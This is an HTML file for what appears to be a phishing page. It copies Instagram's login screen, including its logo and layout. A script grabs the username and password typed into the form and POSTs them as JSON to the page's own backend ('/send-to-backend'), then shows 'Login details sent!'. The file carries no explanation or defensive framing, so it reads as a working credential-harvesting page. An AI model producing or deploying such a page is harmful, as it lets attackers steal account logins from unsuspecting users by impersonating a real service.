<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        /* General Reset */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
        }

        /* Login Container */
        .login-container {
            background-color: #fff;
            border: 1px solid #e6e6e6;
            border-radius: 1px;
            padding: 20px 40px;
            text-align: center;
            max-width: 350px;
            width: 100%;
            margin-bottom: 10px;
        }

        /* Instagram Logo */
        .logo {
            width: 175px;
            margin: 20px auto;
        }

        /* Input Fields */
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 9px 8px;
            margin: 6px 0;
            border: 1px solid #efefef;
            border-radius: 3px;
            background-color: #fafafa;
            font-size: 14px;
            color: #262626;
        }

        input[type="text"]::placeholder, input[type="password"]::placeholder {
            color: #999;
        }

        input[type="text"]:focus, input[type="password"]:focus {
            border-color: #b2b2b2;
            outline: none;
        }

        /* Login Button */
        .login-button {
            width: 100%;
            padding: 8px;
            margin: 10px 0;
            background-color: #3897f0;
            border: none;
            border-radius: 4px;
            color: #fff;
            font-size: 14px;
            font-weight: bold;
            cursor: pointer;
        }

        .login-button:hover {
            background-color: #2684f0;
        }

        /* Separator */
        .separator {
            display: flex;
            align-items: center;
            color: #999;
            margin: 15px 0;
        }

        .separator::before, .separator::after {
            content: '';
            flex: 1;
            border-bottom: 1px solid #efefef;
        }

        .separator::before {
            margin-right: 10px;
        }

        .separator::after {
            margin-left: 10px;
        }

        /* Facebook Login Link */
        .facebook-login {
            color: #385185;
            font-size: 14px;
            font-weight: bold;
            text-decoration: none;
            display: block;
            margin: 10px 0;
        }

        .facebook-login:hover {
            text-decoration: underline;
        }

        /* Forgot Password Link */
        .forgot-password {
            color: #003569;
            font-size: 12px;
            text-decoration: none;
        }

        .forgot-password:hover {
            text-decoration: underline;
        }

        /* Sign Up Section */
        .sign-up {
            background-color: #fff;
            border: 1px solid #e6e6e6;
            padding: 20px;
            text-align: center;
            max-width: 350px;
            width: 100%;
            font-size: 14px;
        }

        .sign-up a {
            color: #3897f0;
            text-decoration: none;
            font-weight: bold;
        }

        .sign-up a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <!-- Login Form -->
    <div class="login-container">
        <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram Logo" class="logo">
        <form id="loginForm">
            <input type="text" id="username" placeholder="Phone number, username, or email" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit" class="login-button">Log In</button>
        </form>
        <div class="separator">OR</div>
        <a href="#" class="facebook-login">Log in with Facebook</a>
        <a href="#" class="forgot-password">Forgot password?</a>
    </div>

    <!-- Sign Up Section -->
    <div class="sign-up">
        Don't have an account? <a href="#">Sign up</a>
    </div>

    <!-- JavaScript to Handle Form Submission -->
    <script>
        document.getElementById('loginForm').addEventListener('submit', function (e) {
            e.preventDefault(); // Prevent the form from submitting the traditional way

            // Get the username and password
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            // Send the data to your backend
            fetch('/send-to-backend', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ username, password }),
            })
            .then(response => response.json())
            .then(data => {
                console.log('Success:', data);
                alert('Login details sent!');
            })
            .catch(error => {
                console.error('Error:', error);
                alert('An error occurred. Please try again.');
            });
        });
    </script>
</body>
</html>
